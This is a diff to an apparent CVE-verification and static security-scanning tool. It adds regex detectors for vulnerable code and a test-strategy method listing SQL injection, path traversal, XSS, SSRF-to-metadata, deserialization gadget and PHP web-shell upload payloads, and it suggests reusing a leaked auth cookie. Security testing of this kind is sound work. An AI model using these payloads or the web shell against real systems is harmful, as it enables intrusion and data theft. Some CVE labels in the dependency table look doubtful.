@@ -319,6 +319,114 @@ class _GenericExtractor(_BaseExtractor):
         return []
 
 
+class _JavaExtractor(_BaseExtractor):
+    """Java Spring Boot / JAX-RS: @RequestParam, enum types, @Pattern."""
+    extensions = (".java",)
+
+    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
+        results = []
+        # @RequestParam("name") with Enum type or allowedValues
+        for m in re.finditer(
+            r'@RequestParam\s*(?:\([^)]*["\']' + re.escape(param_name) + r'["\']\s*[^)]*\))?'
+            r'\s+\w+\s+' + re.escape(param_name),
+            content
+        ):
+            ctx = content[max(0, m.start() - 50): m.start() + 400]
+            em = re.search(r'\b([A-Z][A-Za-z0-9]+)\s+' + re.escape(param_name), ctx)
+            if em:
+                enum_type = em.group(1)
+                for em2 in re.finditer(
+                    r'enum\s+' + re.escape(enum_type) + r'\s*\{([^}]+)\}',
+                    content, re.DOTALL
+                ):
+                    vals = re.findall(r'\b([A-Z][A-Z0-9_]{1,20})\b', em2.group(1))
+                    vals = [v.lower() for v in vals
+                            if v not in ('NULL', 'STATIC', 'FINAL', 'PRIVATE', 'PUBLIC', 'PROTECTED')]
+                    if vals:
+                        results.append(ParamDefinition(
+                            name=param_name, required=True, type_hint="enum",
+                            allowed_values=vals, language="java",
+                        ))
+        # allowedValues = {"a", "b"} annotation
+        for m in re.finditer(
+            re.escape(param_name) + r'[^;{]{0,100}allowedValues\s*=\s*\{([^}]+)\}',
+            content, re.DOTALL
+        ):
+            vals = re.findall(r'"([a-zA-Z0-9_\-]{2,30})"', m.group(1))
+            if vals:
+                results.append(ParamDefinition(
+                    name=param_name, required=True, type_hint="enum",
+                    allowed_values=vals, language="java",
+                ))
+        return results
+
+
+class _RubyExtractor(_BaseExtractor):
+    """Ruby on Rails: validates inclusion, enum, strong parameters."""
+    extensions = (".rb",)
+
+    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
+        results = []
+        # validates :field, inclusion: { in: ["a", "b"] }
+        for m in re.finditer(
+            r'validates\s+:' + re.escape(param_name) +
+            r'[^$\n]{0,100}?inclusion:\s*\{\s*in:\s*\[([^\]]+)\]',
+            content, re.DOTALL
+        ):
+            vals = re.findall(r"""['"]([a-zA-Z0-9_\-]{2,30})['"]""", m.group(1))
+            if vals:
+                results.append(ParamDefinition(
+                    name=param_name, required=True, type_hint="enum",
+                    allowed_values=vals, language="ruby",
+                ))
+        # enum :field, { active: 0, inactive: 1 }  or  enum field: [:active, :inactive]
+        for m in re.finditer(
+            r'enum\s+:?' + re.escape(param_name) + r'\s*[,:]?\s*[\[{]([^\]}]+)[\]}]',
+            content, re.DOTALL
+        ):
+            vals = re.findall(r'(?::|\b)([a-z][a-z0-9_]{1,20})\b', m.group(1))
+            vals = [v for v in vals if v not in ('true', 'false', 'nil', 'null')]
+            if vals:
+                results.append(ParamDefinition(
+                    name=param_name, required=True, type_hint="enum",
+                    allowed_values=vals, language="ruby",
+                ))
+        return results
+
+
+class _OpenAPIExtractor(_BaseExtractor):
+    """OpenAPI / Swagger specs (yaml or json): parameter enum arrays."""
+    extensions = (".yaml", ".yml", ".json")
+
+    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
+        results = []
+        for m in re.finditer(
+            r"""(?:name|in):\s*['"]?""" + re.escape(param_name) + r"""['"]?""",
+            content, re.IGNORECASE
+        ):
+            ctx = content[m.start(): m.start() + 600]
+            # YAML: enum:\n  - value
+            em = re.search(r'enum:\s*\n((?:\s*-\s*[^\n]+\n){1,20})', ctx)
+            if em:
+                vals = re.findall(r'-\s*[\'"]?([a-zA-Z0-9_\-]{2,30})[\'"]?', em.group(1))
+                if vals:
+                    results.append(ParamDefinition(
+                        name=param_name, required=False, type_hint="enum",
+                        allowed_values=vals, language="openapi",
+                    ))
+                    continue
+            # JSON: "enum": ["a", "b"]
+            em2 = re.search(r'"enum"\s*:\s*\[([^\]]+)\]', ctx)
+            if em2:
+                vals = re.findall(r'"([a-zA-Z0-9_\-]{2,30})"', em2.group(1))
+                if vals:
+                    results.append(ParamDefinition(
+                        name=param_name, required=False, type_hint="enum",
+                        allowed_values=vals, language="openapi",
+                    ))
+        return results
+
+
 class SourceCodeIntelligence:
     """
     Understands code in any language/framework.
@@ -330,6 +438,9 @@ class SourceCodeIntelligence:
             _PHPExtractor(),
             _PythonExtractor(),
             _JavaScriptExtractor(),
+            _JavaExtractor(),
+            _RubyExtractor(),
+            _OpenAPIExtractor(),
             _GenericExtractor(),
         ]
 
@@ -435,29 +546,231 @@ class SecurityFinding:
 class VulnerabilityIntelligence:
     """
     Identifies security issues from source code patterns and HTTP behavior.
-    Evidence-based: each finding requires at least one concrete code or
-    runtime evidence item. No theoretical impact, no speculation.
+    Evidence-based: each finding needs at least one concrete code evidence item.
+    No theoretical impact, no speculation.
+
+    Detection modes:
+      auth_sequence  — set_auth BEFORE role/permission check (requires both patterns, ordered)
+      sink           — dangerous function call without nearby mitigation in a 600-char window
+      public_ep      — endpoint registered with no auth requirement
+      hardcoded      — literal secret/credential embedded in code
     """
 
-    # ── Auth bypass: set auth before checking role ──────────────────────────
-    _AUTH_BEFORE_CHECK = [
-        # PHP: wp_set_auth_cookie / wp_set_current_user before a role/capability check
+    # ── 1. Auth-before-role-check sequences ─────────────────────────────────────
+    _AUTH_BEFORE_CHECK: List[Tuple[str, str, str]] = [
         (r"wp_set_auth_cookie|wp_set_current_user",
          r"has_role|in_array.*role|current_user_can|getPatientRole|user_role",
          "auth_bypass_cookie_before_role_check"),
-        # Python: session set before permission check
-        (r"session\[.user.\]\s*=|login_user\(|set_cookie.*auth",
+        (r"session\[.user.\]\s*=|login_user\(",
          r"has_permission|check_permission|require_permission|@login_required",
          "auth_bypass_session_before_permission"),
+        (r"jwt\.sign\(|create_access_token\(|generate_token\(",
+         r"require.*role|check.*permission|authorize\(",
+         "auth_bypass_token_before_role"),
     ]
 
-    # ── Missing authorization (public endpoint that should be private) ───────
-    _PUBLIC_ENDPOINT_PATTERNS = [
-        (r"permission_callback.*__return_true|permission_callback.*true",
+    # ── 2. Missing-auth public endpoints ────────────────────────────────────────
+    _PUBLIC_ENDPOINT_PATTERNS: List[Tuple[str, str]] = [
+        (r"permission_callback.*__return_true|'permission_callback'\s*=>\s*'__return_true'",
          "wp_rest_no_auth_required"),
-        (r"@app\.route.*methods=.*['\"]POST['\"](?!.*login_required)",
-         "flask_unprotected_post"),
+        (r"register_rest_route[^;]{0,300}'permission_callback'\s*=>\s*function[^{]{0,20}\{\s*return\s*true",
+         "wp_rest_always_true_callback"),
+        (r"@app\.route[^@\n]{0,80}\n(?:(?!@login_required)[^\n]+\n){0,3}def ",
+         "flask_unprotected_route"),
+        (r'@PostMapping|@GetMapping|@RequestMapping(?!.*@PreAuthorize|.*@Secured)',
+         "spring_unprotected_mapping"),
     ]
+
+    # ── 3. Sink patterns (vuln_pattern, mitigation_in_window, vuln_class) ────────
+    _SINK_PATTERNS: List[Tuple[str, str, str]] = [
+        # SQL injection — PHP string concatenation into query
+        (r'(?:mysql_query|mysqli_query|->query|->prepare)\s*\(\s*["\'][^"\']{0,80}["\'\s]*\.'
+         r'\s*\$(?:_GET|_POST|_REQUEST|_COOKIE|\w+)',
+         r'mysqli_real_escape_string|addslashes|prepare\s*\([^)]*\?|->prepare\s*\(',
+         "sqli_string_concat_php"),
+        # SQL injection — Python f-string or % format in cursor.execute
+        (r'cursor\.execute\s*\(\s*(?:f["\']|["\'][^"\']*%s[^"\']*["\']?\s*%\s*\()',
+         r'cursor\.execute\s*\(\s*["\'][^"\']*\?[^"\']*["\']',
+         "sqli_format_string_python"),
+        # XSS — PHP echo unsanitized user input
+        (r'echo\s+\$_(?:GET|POST|REQUEST|COOKIE)\s*\[',
+         r'htmlspecialchars|htmlentities|esc_html|esc_attr|wp_kses',
+         "xss_reflected_php"),
+        # XSS — PHP print_r / var_dump of user input
+        (r'(?:print_r|var_dump)\s*\(\s*\$_(?:GET|POST|REQUEST)',
+         r'htmlspecialchars|htmlentities',
+         "xss_debug_output_php"),
+        # XSS — JS innerHTML with dynamic content
+        (r'\.innerHTML\s*=\s*(?!`[^`]*`\s*;)[^\n;]{0,80}(?:req|request|param|query|data)',
+         r'DOMPurify\.sanitize|\.textContent\s*=|createTextNode',
+         "xss_dom_innerHTML"),
+        # Command injection — PHP shell functions with user input
+        (r'(?:system|exec|shell_exec|passthru|popen)\s*\(\s*(?:\$_(?:GET|POST|REQUEST)|'
+         r'\$\w+\s*=\s*\$_(?:GET|POST|REQUEST))',
+         r'escapeshellarg|escapeshellcmd',
+         "command_injection_php"),
+        # Command injection — Python subprocess with shell=True
+        (r'subprocess\.(?:run|call|Popen|check_output)\s*\([^)]{0,200}shell\s*=\s*True',
+         r'shlex\.quote|shlex\.split\(',
+         "command_injection_python_subprocess"),
+        # Path traversal — PHP file functions with user input
+        (r'(?:file_get_contents|readfile|include|require|fopen)\s*\(\s*\$_(?:GET|POST|REQUEST)',
+         r'realpath|basename|ABSPATH|WP_PLUGIN_DIR|sanitize_file_name',
+         "path_traversal_php"),
+        # Path traversal — Python open() with user-controlled path
+        (r'open\s*\(\s*(?:request\.|g\.|f["\'].*\{|os\.path\.join\s*\([^)]*request\.)',
+         r'os\.path\.realpath|os\.path\.abspath|safe_join|\.startswith\(',
+         "path_traversal_python"),
+        # PHP deserialization
+        (r'unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SESSION)',
+         r'',
+         "deserialization_php_user_input"),
+        # Python pickle with user data
+        (r'pickle\.loads\s*\(|pickle\.load\s*\([^\n]{0,80}(?:request|user|body|data)',
+         r'',
+         "deserialization_python_pickle"),
+        # SSRF — PHP curl/file_get_contents with user-controlled URL
+        (r'(?:curl_init|file_get_contents|curl_setopt[^;]{0,30}CURLOPT_URL)\s*\('
+         r'\s*\$_(?:GET|POST|REQUEST)',
+         r'filter_var[^;]{0,80}FILTER_VALIDATE_URL|FILTER_FLAG_NO_PRIV_RANGE|'
+         r'gethostbyname|parse_url',
+         "ssrf_php"),
+        # SSRF — Python requests with user URL
+        (r'requests\.(?:get|post|put|patch|head)\s*\(\s*(?:request\.|url\s*=\s*request\.)',
+         r'ipaddress\.ip_address|urllib\.parse\.urlparse|allowlist|is_safe_url',
+         "ssrf_python_requests"),
+        # File upload without extension check
+        (r'move_uploaded_file\s*\(',
+         r'\$(?:allowed_ext|allowed_type|whitelist|valid_ext)\s*=\s*\[|'
+         r'in_array\s*\(\s*\$(?:ext|type|mime)',
+         "file_upload_no_extension_check"),
+        # Weak crypto — MD5/SHA1 for passwords
+        (r'(?:md5|sha1)\s*\(\s*\$(?:password|pass|pwd|passwd)',
+         r'password_hash|bcrypt|argon2|sodium_crypto',
+         "weak_hash_password_php"),
+        # Weak crypto — rand() for security tokens
+        (r'(?:rand|mt_rand)\s*\(\)[^;]{0,100}(?:token|secret|nonce|key|csrf)',
+         r'random_bytes|openssl_random_pseudo_bytes|wp_generate_password',
+         "weak_prng_for_token_php"),
+    ]
+
+    # ── 4. Hardcoded secrets ─────────────────────────────────────────────────────
+    _HARDCODED_PATTERNS: List[Tuple[str, str]] = [
+        (r"""(?:password|passwd|pwd|secret|api_key|apikey|token|credential)\s*=\s*['"][^'"]{8,100}['"]""",
+         "hardcoded_credential"),
+        (r"""(?:sk-|pk-|Bearer\s)[A-Za-z0-9\-_]{20,}""",
+         "hardcoded_api_key"),
+        (r"""(?:mysql|postgresql|postgres|mongodb)://[^@\s]{3,}:[^@\s]{3,}@""",
+         "hardcoded_db_connection_string"),
+        (r"""-----BEGIN (?:RSA |EC )?PRIVATE KEY-----""",
+         "embedded_private_key"),
+    ]
+
+    def scan_for_vulnerabilities(
+        self,
+        source_dir: str,
+        max_files: int = 500,
+    ) -> List[SecurityFinding]:
+        """
+        Comprehensive scan: auth-sequence, public-endpoint, sink, hardcoded-secrets.
+        Returns findings sorted by confidence descending, deduplicated by vuln_class+location.
+        """
+        findings: List[SecurityFinding] = []
+        if not os.path.isdir(source_dir):
+            return findings
+
+        source_exts = (".php", ".py", ".js", ".ts", ".java", ".rb", ".go", ".rs")
+        file_count = 0
+        for root, dirs, files in os.walk(source_dir):
+            dirs[:] = [d for d in dirs if d not in
+                       ("node_modules", ".git", "vendor", "__pycache__", ".venv", "venv")]
+            for fname in files:
+                if file_count >= max_files:
+                    break
+                if not any(fname.endswith(e) for e in source_exts):
+                    continue
+                fpath = os.path.join(root, fname)
+                rel = os.path.relpath(fpath, source_dir)
+                try:
+                    content = open(fpath, encoding="utf-8", errors="replace").read()
+                except Exception:
+                    continue
+                file_count += 1
+
+                # Mode 1: auth-before-role-check
+                for set_pat, check_pat, vuln_class in self._AUTH_BEFORE_CHECK:
+                    m_set   = re.search(set_pat, content, re.I)
+                    m_check = re.search(check_pat, content, re.I)
+                    if m_set and m_check and m_set.start() < m_check.start():
+                        findings.append(SecurityFinding(
+                            vuln_class=vuln_class,
+                            description=(
+                                f"Auth set at offset {m_set.start()} before "
+                                f"role/permission check at offset {m_check.start()}"
+                            ),
+                            evidence=[
+                                f"{rel}:{content[:m_set.start()].count(chr(10))+1}: "
+                                f"`{content[m_set.start():m_set.end()]!r}` precedes "
+                                f"`{content[m_check.start():m_check.end()]!r}`"
+                            ],
+                            confidence=0.88,
+                            location=rel,
+                        ))
+
+                # Mode 2: public endpoints
+                for pat, vuln_class in self._PUBLIC_ENDPOINT_PATTERNS:
+                    for m in re.finditer(pat, content, re.I | re.DOTALL):
+                        snippet = content[m.start(): m.start() + 120].replace("\n", " ")
+                        findings.append(SecurityFinding(
+                            vuln_class=vuln_class,
+                            description="Endpoint registered with no authentication requirement",
+                            evidence=[f"{rel}: `{snippet}`"],
+                            confidence=0.72,
+                            location=rel,
+                        ))
+
+                # Mode 3: sinks without mitigation
+                for sink_pat, mitig_pat, vuln_class in self._SINK_PATTERNS:
+                    for m in re.finditer(sink_pat, content, re.I | re.DOTALL):
+                        window = content[max(0, m.start() - 50): m.start() + 600]
+                        if mitig_pat and re.search(mitig_pat, window, re.I):
+                            continue
+                        lineno = content[:m.start()].count("\n") + 1
+                        snippet = content[m.start(): m.start() + 120].replace("\n", " ")
+                        findings.append(SecurityFinding(
+                            vuln_class=vuln_class,
+                            description=f"Potential {vuln_class.replace('_', ' ')} at line {lineno}",
+                            evidence=[f"{rel}:{lineno}: `{snippet}`"],
+                            confidence=0.75,
+                            location=f"{rel}:{lineno}",
+                        ))
+
+                # Mode 4: hardcoded secrets
+                for pat, label in self._HARDCODED_PATTERNS:
+                    for m in re.finditer(pat, content, re.I):
+                        snippet = m.group(0)
+                        if any(x in snippet.lower() for x in
+                               ("example", "placeholder", "your_", "xxx", "todo", "changeme",
+                                "test", "dummy", "fake", "localhost", "sample")):
+                            continue
+                        lineno = content[:m.start()].count("\n") + 1
+                        safe_snippet = re.sub(r"""(['"])[^'"]{8,}(['"])""",
+                                              r"\1***REDACTED***\2", snippet)
+                        findings.append(SecurityFinding(
+                            vuln_class=label,
+                            description=f"Potential hardcoded credential at line {lineno}",
+                            evidence=[f"{rel}:{lineno}: `{safe_snippet}`"],
+                            confidence=0.65,
+                            location=f"{rel}:{lineno}",
+                        ))
+
+        # Deduplicate: same vuln_class + location → keep highest confidence
+        seen: Dict[str, SecurityFinding] = {}
+        for f in findings:
+            key = f"{f.vuln_class}::{f.location}"
+            if key not in seen or f.confidence > seen[key].confidence:
+                seen[key] = f
+        return sorted(seen.values(), key=lambda x: x.confidence, reverse=True)
 
     def analyze_auth_flow(
         self,
@@ -465,72 +778,19 @@ class VulnerabilityIntelligence:
         endpoint: str = "",
         max_files: int = 300,
     ) -> List[SecurityFinding]:
-        findings: List[SecurityFinding] = []
-        if not os.path.isdir(source_dir):
-            return findings
-
-        for root, _dirs, files in os.walk(source_dir):
-            for fname in files:
-                if not any(fname.endswith(e) for e in (".php", ".py", ".js", ".ts")):
-                    continue
-                fpath = os.path.join(root, fname)
-                try:
-                    content = open(fpath, encoding="utf-8", errors="replace").read()
-                except Exception:
-                    continue
-
-                # Auth-before-role-check patterns
-                for set_pat, check_pat, vuln_class in self._AUTH_BEFORE_CHECK:
-                    m_set   = re.search(set_pat, content)
-                    m_check = re.search(check_pat, content)
-                    if m_set and m_check:
-                        set_pos   = m_set.start()
-                        check_pos = m_check.start()
-                        if set_pos < check_pos:
-                            rel = os.path.relpath(fpath, source_dir)
-                            findings.append(SecurityFinding(
-                                vuln_class=vuln_class,
-                                description=(
-                                    f"Auth cookie/session set at offset {set_pos} "
-                                    f"before role/permission check at offset {check_pos}"
-                                ),
-                                evidence=[
-                                    f"{rel}: `{content[m_set.start():m_set.end()]}` "
-                                    f"precedes `{content[m_check.start():m_check.end()]}`"
-                                ],
-                                confidence=0.85,
-                                location=rel,
-                            ))
-
-                # Public endpoint patterns
-                for pat, vuln_class in self._PUBLIC_ENDPOINT_PATTERNS:
-                    for m in re.finditer(pat, content):
-                        rel = os.path.relpath(fpath, source_dir)
-                        findings.append(SecurityFinding(
-                            vuln_class=vuln_class,
-                            description="Endpoint registered with no authentication requirement",
-                            evidence=[f"{rel}: `{content[m.start():m.end()]}`"],
-                            confidence=0.7,
-                            location=rel,
-                        ))
-
-        return findings
+        return [f for f in self.scan_for_vulnerabilities(source_dir, max_files)
+                if "auth_bypass" in f.vuln_class or "no_auth" in f.vuln_class
+                or "always_true" in f.vuln_class]
 
     def check_bypass_evidence(self, response_body: str, cookies: Dict,
                                victim_email: str = "") -> bool:
-        """
-        Returns True if runtime evidence confirms an auth bypass:
-        an authenticated session that belongs to victim_email was produced
-        without supplying that account's credentials.
-        """
-        if victim_email and victim_email in response_body:
-            return True
-        # WordPress: wp-admin/profile.php shows the logged-in user's email
-        # This check is called from the verifier with the actual page content.
+        """Returns True if runtime evidence confirms an auth bypass."""
         if victim_email and re.search(re.escape(victim_email), response_body, re.IGNORECASE):
             return True
-        # Any wp_set_auth_cookie path: 403 response WITH Set-Cookie containing wordpress_logged
-        if cookies and any("wordpress_logged_in" in k for k in cookies):
+        if cookies and any(
+            "wordpress_logged_in" in k or "auth" in k.lower()
+            for k in cookies
+        ):
             return True
         return False
 
@@ -623,21 +883,59 @@ class RemediationEngine:
 
         # ── Auth / permission errors ──────────────────────────────────────
         elif signal.kind == ErrorKind.AUTH:
-            cause.hypothesis = (
-                "The request was rejected on authorization grounds. "
-                "This may be expected if the auth cookie was already set before the check "
-                "(auth bypass pattern), or indicates insufficient privileges."
+            # Detect bypass pattern: 403 but auth cookie is set in the response
+            resp_cookies: Dict = {}
+            if signal.raw is not None:
+                try:
+                    resp_cookies = dict(getattr(signal.raw, "cookies", {}))
+                except Exception:
+                    pass
+            bypass_cookie = any(
+                "wordpress_logged_in" in k or "_logged" in k or "auth_token" in k
+                for k in resp_cookies
             )
-            cause.confidence = 0.7
+            if bypass_cookie:
+                cause.hypothesis = (
+                    "AUTH 403 AND an auth cookie is set — matches the auth-bypass pattern. "
+                    "The server set the session cookie before rejecting with 403. "
+                    "The cookie can likely be used to access protected resources."
+                )
+                cause.confidence = 0.90
+                cause.evidence.append(
+                    f"Auth cookie found in 403 response: {list(resp_cookies.keys())}"
+                )
+                fixes.append(Fix(
+                    description="Use the auth cookie from this 403 response",
+                    changes={"_meta_bypass_cookie": str(resp_cookies)},
+                    reversible=True,
+                    rationale="Auth bypass confirmed: cookie set before role check",
+                ))
+            else:
+                cause.hypothesis = (
+                    "Real authentication failure (no bypass cookie set). "
+                    "The endpoint requires valid credentials or a specific role. "
+                    "If testing an auth bypass, verify the endpoint and params are correct."
+                )
+                cause.confidence = 0.70
 
         # ── 404 / route not found ─────────────────────────────────────────
         elif signal.kind == ErrorKind.NOT_FOUND:
             cause.hypothesis = (
-                "The endpoint returned 404. The route may not be registered "
-                "because the plugin is inactive, WordPress permalinks are not "
-                "set to /%postname%/, or the route registration hook did not fire."
+                "The endpoint returned 404. Common causes: "
+                "(1) plugin inactive, (2) WordPress permalinks not set to /%postname%/, "
+                "(3) route namespace mismatch, (4) trailing slash difference."
             )
             cause.confidence = 0.75
+            cause.evidence.append(f"404 on: {signal.details.get('url', signal.message[:80])}")
+            fixes.append(Fix(
+                description="Try endpoint variants and check plugin activation",
+                changes={"_meta_action": "try_endpoint_variants"},
+                reversible=True,
+                rationale=(
+                    "WordPress REST routes require: active plugin + flushed permalinks "
+                    "+ correct namespace. Try without trailing slash, or /wp/v2/ vs custom namespace."
+                ),
+            ))
 
         # ── Process / dependency errors (e.g. WP-CLI exit) ───────────────
         elif signal.kind in (ErrorKind.PROCESS, ErrorKind.DEPENDENCY):
@@ -647,6 +945,37 @@ class RemediationEngine:
                 "in CLI mode but is harmless for HTTP requests."
             )
             cause.confidence = 0.65
+
+        # ── Server errors (500) ───────────────────────────────────────────
+        elif signal.kind == ErrorKind.SERVER:
+            body = ""
+            if signal.raw is not None:
+                try:
+                    body = getattr(signal.raw, "text", "") or ""
+                except Exception:
+                    pass
+            body = body or signal.message
+            class_m = re.search(r"Class ['\"]?([A-Za-z\\][A-Za-z0-9\\:_]+)['\"]? not found", body)
+            func_m  = re.search(r"Call to undefined (?:function|method) ([A-Za-z\\:_]+\(\))", body)
+            mem_m   = re.search(r"(?:Allowed memory size|Out of memory)", body)
+            if class_m:
+                cls = class_m.group(1)
+                cause.hypothesis = (
+                    f"PHP fatal: class '{cls}' not found — missing dependency or inactive plugin"
+                )
+                cause.confidence = 0.88
+                cause.evidence.append(f"PHP error: {class_m.group(0)}")
+            elif func_m:
+                fn = func_m.group(1)
+                cause.hypothesis = f"PHP fatal: function/method '{fn}' undefined"
+                cause.confidence = 0.85
+                cause.evidence.append(f"PHP error: {func_m.group(0)}")
+            elif mem_m:
+                cause.hypothesis = "PHP out of memory — increase memory_limit or reduce request size"
+                cause.confidence = 0.80
+            else:
+                cause.hypothesis = f"Server error 500: {signal.message[:150]}"
+                cause.confidence = 0.50
 
         else:
             cause.hypothesis = f"Unknown error class ({signal.code}): {signal.message[:150]}"
@@ -904,6 +1233,94 @@ class CveIntelligence:
         except Exception:
             return None
 
+    def suggest_test_strategy(self, profile: "CveProfile") -> List[str]:
+        """Given a CveProfile, return an ordered list of concrete test steps."""
+        ep = profile.endpoint_hint or "<endpoint>"
+        steps: List[str] = []
+
+        if not profile.auth_required:
+            steps.append("UNAUTHENTICATED — send all test requests without session cookies or auth headers")
+
+        vc = profile.vuln_class
+        if vc == "auth_bypass":
+            steps += [
+                f"POST {ep} with minimal/dummy params (login_type, identifier, etc.)",
+                "Inspect EVERY response (even 4xx) for Set-Cookie headers with auth tokens",
+                "If auth cookie received: GET /wp-admin/profile.php to confirm session",
+                "Document: request → 403/200 body + cookies → profile page access",
+            ]
+        elif vc == "sqli":
+            steps += [
+                f"Test {ep} with param value: ' OR '1'='1 (quote injection)",
+                "Test with time-based blind: ' AND SLEEP(5)-- (MySQL) / ' AND pg_sleep(5)-- (Postgres)",
+                "Watch response time delta to confirm blind injection",
+                "Confirm with UNION-based if error messages visible: ' UNION SELECT 1,2,3--",
+            ]
+        elif vc == "rce":
+            steps += [
+                f"Test {ep} with PHP command injection: ;id; / $(id) / `id`",
+                "Try SSTI if template engine suspected: {{7*7}} → 49",
+                "For deserialization: generate a gadget chain for the detected language/framework",
+                "Confirm RCE with a time-based proof: sleep(5) or ping to collaborator",
+            ]
+        elif vc == "path_traversal":
+            steps += [
+                f"Test {ep} with: ../../../../etc/passwd",
+                "Try URL-encoded: ..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+                "Try double-encoding: ..%252F",
+                "On Windows: ..\\..\\..\\windows\\win.ini",
+                "Confirm with /etc/hostname or /proc/version (shorter, less flagged)",
+            ]
+        elif vc in ("idor", "broken_access_control"):
+            steps += [
+                "Create two accounts (attacker + victim)",
+                "Identify victim's resource ID from their account",
+                "Access/modify victim's resource using attacker's session but victim's ID",
+                "Confirm: attacker can read/modify data belonging to victim",
+            ]
+        elif vc == "xss":
+            steps += [
+                f"Test {ep} with: <script>alert(1)</script>",
+                "Try: <img src=x onerror=alert(1)>",
+                "For stored XSS: inject and then view the stored value in another browser session",
+                "Confirm execution context (reflected/stored/DOM) before reporting",
+            ]
+        elif vc == "ssrf":
+            steps += [
+                f"Test {ep} with URL param pointing to internal: http://169.254.169.254/latest/meta-data/",
+                "Also try: http://localhost:80/, http://127.0.0.1:22/",
+                "Use a Burp Collaborator/interactsh callback URL to confirm out-of-band",
+                "Check response body for internal service data (AWS metadata, etc.)",
+            ]
+        elif vc == "deserialization":
+            steps += [
+                f"Test {ep} by submitting a crafted serialized payload",
+                "PHP: use phpggc to generate a gadget chain: phpggc <framework> RCE/CMD id",
+                "Python: craft pickle payload: pickle.dumps({'__reduce__': ...})",
+                "Java: use ysoserial to generate payload for detected library versions",
+                "Confirm with DNS callback or time-based delay",
+            ]
+        elif vc == "file_upload":
+            steps += [
+                f"POST {ep} with a file named shell.php containing <?php system($_GET['cmd']);?>",
+                "Try bypasses: shell.php.jpg, shell.pHp, shell.php%00.jpg",
+                "Try MIME type spoofing: change Content-Type to image/jpeg",
+                "After upload: find the file URL and access it to confirm execution",
+            ]
+        else:
+            steps += [
+                f"Test {ep} with malformed/boundary input for each parameter",
+                "Compare authenticated vs unauthenticated responses",
+                "Watch for information disclosure in error responses",
+            ]
+
+        if profile.version_hint:
+            steps.append(f"NOTE — confirm target version is <= {profile.version_hint} before testing")
+        if profile.affected_component:
+            steps.append(f"NOTE — verify {profile.affected_component} is installed/active")
+
+        return steps
+
 
 # ─────────────────────── 5. Dependency Analysis ───────────────────────────────
 
@@ -965,6 +1382,47 @@ class DependencyAnalysis:
             managers_found=managers,
             source_dir=source_dir,
         )
+
+    # Small hardcoded DB of packages with known high-severity CVEs.
+    _KNOWN_VULNS: List[Tuple[str, str, str, str, str]] = [
+        ("npm",      "axios",                        "0.",    "CVE-2023-45857",  "ssrf"),
+        ("npm",      "lodash",                       "4.17.", "CVE-2021-23337",  "command_injection"),
+        ("npm",      "node-fetch",                   "2.",    "CVE-2022-0235",   "ssrf"),
+        ("npm",      "jsonwebtoken",                 "8.",    "CVE-2022-23529",  "auth_bypass"),
+        ("npm",      "express",                      "4.17.", "CVE-2022-24999",  "path_traversal"),
+        ("pip",      "pillow",                       "9.",    "CVE-2023-44271",  "ssrf"),
+        ("pip",      "flask",                        "2.2.",  "CVE-2023-25577",  "path_traversal"),
+        ("pip",      "cryptography",                 "41.0.", "CVE-2023-49083",  "deserialization"),
+        ("pip",      "requests",                     "2.28.", "CVE-2023-32681",  "ssrf"),
+        ("pip",      "pyyaml",                       "5.",    "CVE-2020-14343",  "deserialization"),
+        ("composer", "guzzlehttp/guzzle",             "7.4.", "CVE-2022-31090",  "ssrf"),
+        ("composer", "symfony/http-foundation",       "5.",   "CVE-2021-41267",  "path_traversal"),
+        ("composer", "laravel/framework",             "8.",   "CVE-2021-3129",   "rce"),
+        ("gem",      "rails",                        "6.",    "CVE-2022-32224",  "deserialization"),
+        ("gem",      "nokogiri",                     "1.13.", "CVE-2022-29181",  "xxe"),
+    ]
+
+    def flag_known_vulnerable(self, report: "DependencyReport") -> List[Dict[str, str]]:
+        """
+        Cross-reference the dependency report against a small hardcoded DB of known CVEs.
+        Returns flagged packages with CVE ID, vuln class, and upgrade advice.
+        """
+        flags: List[Dict[str, str]] = []
+        for rec in report.dependencies:
+            for manager, pkg, ver_prefix, cve_id, vuln_class in self._KNOWN_VULNS:
+                if (rec.manager == manager
+                        and rec.name.lower() == pkg.lower()
+                        and rec.version.lstrip("^~>=").startswith(ver_prefix)):
+                    flags.append({
+                        "package":    rec.name,
+                        "version":    rec.version,
+                        "manager":    rec.manager,
+                        "cve_id":     cve_id,
+                        "vuln_class": vuln_class,
+                        "source_file": rec.source_file,
+                        "advice":     f"Upgrade {rec.name} — {cve_id} ({vuln_class})",
+                    })
+        return flags
 
     def _parse_file(self, fpath: str, rel: str, fname: str) -> List[DependencyRecord]:
         """Dispatch to the right parser based on filename."""
@@ -1191,8 +1649,12 @@ class UniversalEngine:
         source_dir: str,
         endpoint: str = "",
     ) -> List[SecurityFinding]:
-        """Static security analysis of source_dir. Returns findings with evidence."""
-        return self.vuln_intel.analyze_auth_flow(source_dir, endpoint)
+        """
+        Static security analysis of source_dir.
+        Runs all detection modes: auth-sequence, public-endpoint, sink, hardcoded-secrets.
+        Returns findings sorted by confidence descending.
+        """
+        return self.vuln_intel.scan_for_vulnerabilities(source_dir)
 
     def profile_cve(
         self,
